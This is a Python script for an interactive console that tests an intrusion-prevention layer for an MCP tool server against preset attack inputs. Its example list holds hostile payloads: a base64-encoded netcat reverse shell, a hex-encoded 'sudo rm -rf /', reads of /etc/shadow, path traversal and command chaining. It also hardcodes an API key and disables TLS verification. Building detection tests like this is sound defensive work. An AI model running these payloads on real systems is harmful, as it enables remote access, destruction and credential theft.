#!/usr/bin/env python3
"""
TrueIntent Interactive Threat Testing Console
Allows interactive testing of arbitrary prompts, commands, base64/hex injections,
and evaluates them across all inspection layers and against the live IPS server.
"""

import sys
import os
import json
import ssl
import time
import urllib.request
import urllib.error

# Setup module search paths
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(BASE_DIR, 'module4-semantic'))
sys.path.insert(0, os.path.join(BASE_DIR, 'module3-policy'))

try:
    from inspector import ThreatDetector, AdvancedDeobfuscator, notify_server_block
except ImportError as e:
    print(f"Error importing inspector: {e}")
    sys.exit(1)

try:
    from engine import PolicyAdapter
    policy_engine = PolicyAdapter(os.path.join(BASE_DIR, 'module3-policy', 'policy.json'))
except Exception as e:
    policy_engine = None

API_KEY = "qucHMIbXHvj5JiVjPYSpkotBtDJeOe9e5OzreZPfrZE"
SERVER_URL = "https://127.0.0.1:8443/mcp"
CONTROL_URL = "http://127.0.0.1:8444/ips-control"

# SSL Context ignoring self-signed cert for demo server
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

detector = ThreatDetector()
deobfuscator = AdvancedDeobfuscator()

# ANSI Color codes
BOLD = "\033[1m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

EXAMPLES = [
    ("Benign Ping", "ping", {"host": "127.0.0.1"}),
    ("Benign Echo", "execute_command", {"cmd": "echo 'Hello TrueIntent'"}),
    ("Base64 Reverse Shell", "execute_command", {"cmd": "echo 'bmMgLWUgL2Jpbi9zaCAxMC4wLjAuMSA0NDQ0' | base64 -d | sh"}),
    ("Hex-Escaped Sudo rm -rf", "execute_command", {"cmd": "\\x73\\x75\\x64\\x6f\\x20\\x72\\x6d\\x20\\x2d\\x72\\x66\\x20\\x2f"}),
    ("Direct Privilege Escalation", "execute_command", {"cmd": "sudo chmod 777 /etc/shadow"}),
    ("Sensitive File Read", "read_file", {"path": "/etc/shadow"}),
    ("Path Traversal Attack", "read_file", {"path": "../../../etc/passwd"}),
    ("Command Injection & Chaining", "execute_command", {"cmd": "uptime; cat /etc/passwd"}),
    ("Nested Obfuscation (URL + Hex)", "execute_command", {"cmd": "%5cx73%5cx75%5cx64%5cx6f /bin/sh"}),
]

def print_banner():
    print(f"\n{BOLD}{CYAN}========================================================================{RESET}")
    print(f"{BOLD}{CYAN}      🛡️  TrueIntent eBPF Interactive Threat Testing Console  🛡️{RESET}")
    print(f"{BOLD}{CYAN}========================================================================{RESET}")
    print(f"Test arbitrary commands, Base64/Hex evasion payloads, and observe:")
    print(f"  • {BOLD}Layer 1:{RESET} Capability & Policy Validation")
    print(f"  • {BOLD}Layer 2:{RESET} De-obfuscation Engine (Hex, Base64, URL unquoting)")
    print(f"  • {BOLD}Layer 3:{RESET} Semantic AST & Signature Threat Detection")
    print(f"  • {BOLD}Layer 4:{RESET} Live Server Execution & IPS Enforcement (HTTP 200 vs 403)\n")
    print(f"Commands:")
    print(f"  • Type {BOLD}'examples'{RESET} to view and run preset attack vectors")
    print(f"  • Type {BOLD}'read_file <path>'{RESET} to test file access")
    print(f"  • Type any shell command or payload to test (e.g. {YELLOW}\\x73\\x75\\x64\\x6f...{RESET})")
    print(f"  • Type {BOLD}'exit'{RESET} or {BOLD}'quit'{RESET} to return to terminal\n")

def test_payload(tool_name, arguments, req_id=None):
    if req_id is None:
        req_id = int(time.time() * 1000) % 1000000

    print(f"\n{BOLD}------------------------------------------------------------------------{RESET}")
    print(f"[*] {BOLD}TESTING TOOL CALL:{RESET} {CYAN}{tool_name}{RESET}")
    print(f"[*] {BOLD}ARGUMENTS:{RESET} {json.dumps(arguments)}")
    # 0. Policy Engine Check
    print(f"\n{BOLD}[Layer 1: Policy Engine & Capability Control]{RESET}")
    if policy_engine:
        pol_action, pol_reason = policy_engine.evaluate_tool_call(tool_name, arguments)
        if pol_action == "allow":
            print(f"  {GREEN}✓ Policy Decision: ALLOW ({pol_reason}){RESET}")
        elif pol_action == "block":
            print(f"  {RED}⛔ Policy Decision: BLOCK ({pol_reason}){RESET}")
        else:
            print(f"  {YELLOW}⚠ Policy Decision: {pol_action.upper()} ({pol_reason}){RESET}")
    else:
        print(f"  {YELLOW}⚠ Policy engine not initialized{RESET}")

    # 1. Deobfuscation Check
    deobf_args = {}
    has_obfuscation = False
    for k, v in arguments.items():
        if isinstance(v, str):
            deobf_v = deobfuscator.deobfuscate(v)
            deobf_args[k] = deobf_v
            if deobf_v != v:
                has_obfuscation = True

    print(f"\n{BOLD}[Layer 2: Deobfuscation Engine]{RESET}")
    if has_obfuscation:
        print(f"  {YELLOW}⚠ Obfuscation Detected!{RESET}")
        for k, v in arguments.items():
            if v != deobf_args.get(k):
                print(f"  ↳ Parameter '{k}':")
                print(f"     Original:     {v}")
                print(f"     Deobfuscated:{GREEN} {deobf_args.get(k)}{RESET}")
    else:
        print(f"  {GREEN}✓ No encoding/obfuscation detected (clean payload){RESET}")

    # 2. Semantic Threat Detection
    decision, reason, details = detector.check_arguments(arguments)
    print(f"\n{BOLD}[Layer 3: Semantic Threat Detection]{RESET}")
    if decision == "flag":
        print(f"  {RED}🚨 THREAT DETECTED: {reason}{RESET}")
        for d in details.get("detections", []):
            print(f"    • {BOLD}{d.get('description')}{RESET} (pattern: `{d.get('pattern')}`) matched: `{d.get('matched')}`")
        # Trigger out-of-band IPS block on control port
        notify_server_block(req_id)
        print(f"  ↳ Dispatched out-of-band block signal to IPS control (:8444) for Request ID {req_id}")
    else:
        print(f"  {GREEN}✓ Clean: No malicious execution or injection signatures matched.{RESET}")

    # 3. Live MCP Server Query
    print(f"\n{BOLD}[Layer 4: Live MCP Server & IPS Enforcement]{RESET}")
    mcp_body = json.dumps({
        "jsonrpc": "2.0",
        "id": req_id,
        "method": "tools/call",
        "params": {
            "name": tool_name,
            "arguments": arguments
        }
    }).encode("utf-8")

    req = urllib.request.Request(
        SERVER_URL,
        data=mcp_body,
        headers={
            "Content-Type": "application/json",
            "X-API-Key": API_KEY
        }
    )

    try:
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=5) as response:
            resp_body = response.read().decode('utf-8', errors='ignore')
            print(f"  {GREEN}✔ HTTP {response.status} OK - EXECUTION ALLOWED{RESET}")
            try:
                parsed = json.loads(resp_body)
                print(f"  Server Output: {json.dumps(parsed.get('result', {}), indent=2)}")
            except Exception:
                print(f"  Server Output: {resp_body}")
    except urllib.error.HTTPError as e:
        resp_body = ""
        try:
            resp_body = e.read().decode('utf-8', errors='ignore')
        except Exception:
            pass
        if e.code == 403:
            print(f"  {RED}⛔ HTTP 403 FORBIDDEN - BLOCKED BY TRUEINTENT IPS{RESET}")
            try:
                parsed = json.loads(resp_body)
                print(f"  Error message: {RED}{parsed.get('error', {}).get('message')}{RESET}")
            except Exception:
                print(f"  Response: {resp_body}")
        elif e.code == 429:
            print(f"  {YELLOW}⏳ HTTP 429 TOO MANY REQUESTS - RATE LIMIT TRIGGERED{RESET}")
        else:
            print(f"  {YELLOW}⚠ HTTP {e.code}: {resp_body}{RESET}")
    except Exception as e:
        print(f"  {YELLOW}⚠ Could not connect to live server on {SERVER_URL}: {e}{RESET}")
        print(f"    (Make sure 'python3 demo-ips/server.py' is running)")

    print(f"{BOLD}------------------------------------------------------------------------{RESET}\n")

def show_examples():
    print(f"\n{BOLD}Available Presets / Example Attacks:{RESET}")
    for idx, (title, tool, args) in enumerate(EXAMPLES, 1):
        print(f"  [{CYAN}{idx}{RESET}] {BOLD}{title}{RESET} ({tool}: {args})")
    print()
    choice = input(f"Enter preset number (1-{len(EXAMPLES)}) or press Enter to cancel: ").strip()
    if choice.isdigit() and 1 <= int(choice) <= len(EXAMPLES):
        title, tool, args = EXAMPLES[int(choice) - 1]
        test_payload(tool, args)

def main():
    print_banner()
    while True:
        try:
            user_input = input(f"{BOLD}{GREEN}TrueIntent-Test>{RESET} ").strip()
            if not user_input:
                continue

            if user_input.lower() in ["exit", "quit", "q"]:
                print("Exiting interactive tester. Goodbye!")
                break

            if user_input.lower() in ["help", "?"]:
                print_banner()
                continue

            if user_input.lower() in ["examples", "example", "presets"]:
                show_examples()
                continue

            # Parsing input
            if user_input.startswith("read_file"):
                parts = user_input.split(maxsplit=1)
                path = parts[1].strip() if len(parts) > 1 else "/etc/passwd"
                test_payload("read_file", {"path": path})
            elif user_input.startswith("ping"):
                parts = user_input.split(maxsplit=1)
                host = parts[1].strip() if len(parts) > 1 else "127.0.0.1"
                test_payload("ping", {"host": host})
            elif user_input.startswith("tool:"):
                # Format: tool: <name> <json_args>
                parts = user_input[5:].strip().split(maxsplit=1)
                t_name = parts[0]
                t_args = json.loads(parts[1]) if len(parts) > 1 else {}
                test_payload(t_name, t_args)
            else:
                # Default to execute_command
                test_payload("execute_command", {"cmd": user_input})

        except KeyboardInterrupt:
            print("\nExiting interactive tester. Goodbye!")
            break
        except Exception as e:
            print(f"{RED}Error: {e}{RESET}")

if __name__ == "__main__":
    main()
